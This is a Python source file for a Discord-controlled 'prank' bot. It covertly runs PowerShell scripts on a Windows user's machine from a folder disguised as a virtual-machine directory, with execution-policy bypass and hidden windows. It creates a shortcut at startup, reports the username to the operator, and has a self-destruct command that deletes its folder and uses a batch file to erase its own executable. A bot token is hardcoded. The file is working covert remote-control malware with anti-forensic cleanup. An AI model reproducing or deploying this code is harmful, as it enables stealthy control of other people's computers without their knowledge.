from discord.ext import commands
import subprocess
import traceback
import tempfile
import asyncio
import discord
import shutil
import time
import sys
import os

# Create a Discord bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
TOKEN = 'MTE3Nzg3NjY0NzQ1NDcyMDA0MQ.GGrmyu.5pVabksrR4Tb6-rkQco9ggrXZSMXXVVqNIfS_E'
run = True
running_process = None
CREATE_NO_WINDOW = 0x08000000


@bot.event
async def on_ready():
    print(f'{bot.user.name} has connected to Discord!')
    print("Registered commands:")
    for command in bot.commands:
        print(command.name)


@bot.command(name='start')
async def start_prank(ctx, sound_name="win"):
    global run
    if not run:
        return
    await ctx.send(f"Receive start command")
    sound_name = sound_name + ".WAV"
    print('Received start command')
    activate_sound()
    time.sleep(2)
    loop = asyncio.get_running_loop()

    def launch():
        global running_process
        path = os.path.expandvars(r'%USERPROFILE%\Documents\Virtual Machines\Ubuntu24\ubuntu24.ps1')

        try:
            running_process = subprocess.Popen([
                "powershell.exe",
                "-ExecutionPolicy", "Bypass",
                "-WindowStyle", "Hidden",
                "-File", path,
                "-SoundName", sound_name
            ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=CREATE_NO_WINDOW,
                text=True)

            stdout, stderr = running_process.communicate(timeout=10)  # Wait for output

            if stderr:
                with open(os.path.expandvars(r'%TEMP%\ps1_error_log.txt'), 'w') as f:
                    f.write(stderr)
                print(f"[ERROR] {stderr}")
                return f"Error occurred:\n{stderr}"

            return "No error"

        except Exception as e:
            print(f"[Exception] {e}")
            return f"Exception while launching: {e}"

    result = await loop.run_in_executor(None, launch)
    await ctx.send(result)


@bot.command(name='stop')
async def stop_process(ctx):
    global running_process
    if running_process and running_process.poll() is None:  # still running
        running_process.terminate()  # or .kill() if needed
        running_process.wait()
        await ctx.send("Process has been stopped.")
    else:
        await ctx.send("No process is currently running.")


@bot.command(name='info')
async def get_username(ctx):
    global run
    print('Received info command')
    path = os.path.expandvars(r'%USERPROFILE%')
    user = path.split("\\")[-1]
    print("3", run)
    await ctx.send(f"{user} running" if run else f"{user} not running")


@bot.command(name='sound')
async def small_sound(ctx, sound_name="win"):
    global run
    if not run:
        return
    await ctx.send(f"Received sound command")
    sound_name = sound_name + ".WAV"
    activate_sound()
    time.sleep(2)
    print('Received sound command')
    loop = asyncio.get_running_loop()

    def launch():
        path = os.path.expandvars(r'%USERPROFILE%\Documents\Virtual Machines\Ubuntu24\ubuntu25.ps1')

        try:
            subprocess.Popen([
                "powershell.exe",
                "-ExecutionPolicy", "Bypass",
                "-WindowStyle", "Hidden",
                "-File", path,
                "-SoundName", sound_name
            ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=CREATE_NO_WINDOW,
                text=True)

            return "Launched successfully."

        except Exception as e:
            print(f"[Exception] {e}")
            return f"Exception while launching: {e}"

    result = await loop.run_in_executor(None, launch)
    await ctx.send(result)


@bot.command(name='deactivate')
async def deactivate_user(ctx, name: str):
    global run
    print('Received deactivate command for', name)
    path = os.path.expandvars(r'%USERPROFILE%')
    user = path.split("\\")[-1]
    if name == user:
        await ctx.send(f"Deactivated {user}")
        run = False
    elif name == 'all':
        await ctx.send(f"Deactivated for all")
        run = False
    else:
        await ctx.send(f"No name found for {name}")


@bot.command(name='activate')
async def activate_user(ctx, name: str):
    global run
    print('Received continue command for', name)
    path = os.path.expandvars(r'%USERPROFILE%')
    user = path.split("\\")[-1]
    if name == user:
        await ctx.send(f"Reactivated {user}")
        run = True
    elif name == 'all':
        await ctx.send(f"Reactivated for all")
        run = True
    else:
        await ctx.send(f"No name found for {name}")


@bot.command(name='quit')
async def quit(ctx, name: str):
    path = os.path.expandvars(r'%USERPROFILE%')
    user = path.split("\\")[-1]
    if name == user:
        sys.exit(0)


async def send_error_to_discord(error_msg: str):
    channel = bot.get_channel(DISCORD_CHANNEL_ID)
    if channel:
        await channel.send(f"❌ Self-delete failed:\n```\n{error_msg}\n```")
    else:
        print("Couldn't find Discord channel to send error.")


def self_delete():
    try:
        exe_path = sys.executable
        current_dir = os.path.dirname(exe_path)
        parent_dir = os.path.dirname(current_dir)  # This is folder A
        bat_path = os.path.join(parent_dir, "delete_self.bat")

        with open(bat_path, 'w') as bat_file:
            bat_file.write(f"""
@echo off
:loop
tasklist | findstr /I /C:"{os.path.basename(exe_path)}" >nul
if not errorlevel 1 (
    timeout /T 1 >nul
    goto loop
)
del "{exe_path}" >nul
del "%~f0" >nul
""")

        subprocess.Popen([bat_path], shell=True)

    except Exception as e:
        # Capture traceback to send to Discord
        error_trace = traceback.format_exc()
        # Run Discord error reporting as a background task
        bot.loop.create_task(send_error_to_discord(error_trace))


def execute_reinstate():
    loop = asyncio.get_running_loop()

    def launch():
        path = os.path.expandvars(r'%USERPROFILE%\Documents\Virtual Machines\Ubuntu24\reinstate.ps1')

        try:
            subprocess.Popen([
                "powershell.exe",
                "-ExecutionPolicy", "Bypass",
                "-WindowStyle", "Hidden",
                "-File", path,
            ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=CREATE_NO_WINDOW,
                text=True)

            return "Reinstated parameter successfully."

        except Exception as e:
            print(f"[Exception] {e}")
            return f"Exception while reinstating: {e}"

    loop.run_in_executor(None, launch)


def activate_sound():
    loop = asyncio.get_running_loop()

    def launch():
        path = os.path.expandvars(r'%USERPROFILE%\Documents\Virtual Machines\Ubuntu24\resound.ps1')

        try:
            subprocess.Popen([
                "powershell.exe",
                "-ExecutionPolicy", "Bypass",
                "-WindowStyle", "Hidden",
                "-File", path,
            ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=CREATE_NO_WINDOW,
                text=True)

            return "Reinstated parameter successfully."

        except Exception as e:
            print(f"[Exception] {e}")
            return f"Exception while reinstating: {e}"

    loop.run_in_executor(None, launch)


@bot.command(name="reinstate")
async def reinstate(ctx, name: str):
    path = os.path.expandvars(r'%USERPROFILE%')
    user = path.split("\\")[-1]
    if not name == user:
        return
    loop = asyncio.get_running_loop()

    def launch():
        path = os.path.expandvars(r'%USERPROFILE%\Documents\Virtual Machines\Ubuntu24\reinstate.ps1')

        try:
            subprocess.Popen([
                "powershell.exe",
                "-ExecutionPolicy", "Bypass",
                "-WindowStyle", "Hidden",
                "-File", path,
            ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=CREATE_NO_WINDOW,
                text=True)

            return "Reinstated parameter successfully."

        except Exception as e:
            print(f"[Exception] {e}")
            return f"Exception while reinstating: {e}"

    result = await loop.run_in_executor(None, launch)
    await ctx.send(result)


def make_shortcut():

    def launch():
        path = os.path.expandvars(r'%USERPROFILE%\Documents\Virtual Machines\Ubuntu24\shortcutmaker.ps1')

        try:
            subprocess.Popen([
                "powershell.exe",
                "-ExecutionPolicy", "Bypass",
                "-WindowStyle", "Hidden",
                "-File", path,
            ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=CREATE_NO_WINDOW,
                text=True)

            return "Reinstated parameter successfully."

        except Exception as e:
            print(f"[Exception] {e}")
            return f"Exception while reinstating: {e}"

    launch()
    print("Created shortcut")


def delete_folder():
    folder_path = os.path.expandvars(r'%USERPROFILE%')
    folder_path += "\\Documents\\Virtual Machines\\Ubuntu24"

    shutil.rmtree(folder_path)


@bot.command(name="selfdestruct")
async def destroy(ctx, name: str):
    path = os.path.expandvars(r'%USERPROFILE%')
    user = path.split("\\")[-1]
    if not name == user:
        return
    delete_folder()
    await ctx.send("Folder deleted successfully")
    execute_reinstate()
    await ctx.send("Reinstated successfully")
    await ctx.send("🧨 Self-destruct sequence initiated...")
    time.sleep(2)  # Optional dramatic pause
    self_delete()
    await ctx.send("💥 If all goes well, I will now disappear...")
    await bot.close()


make_shortcut()
print('Running')
bot.run(TOKEN)
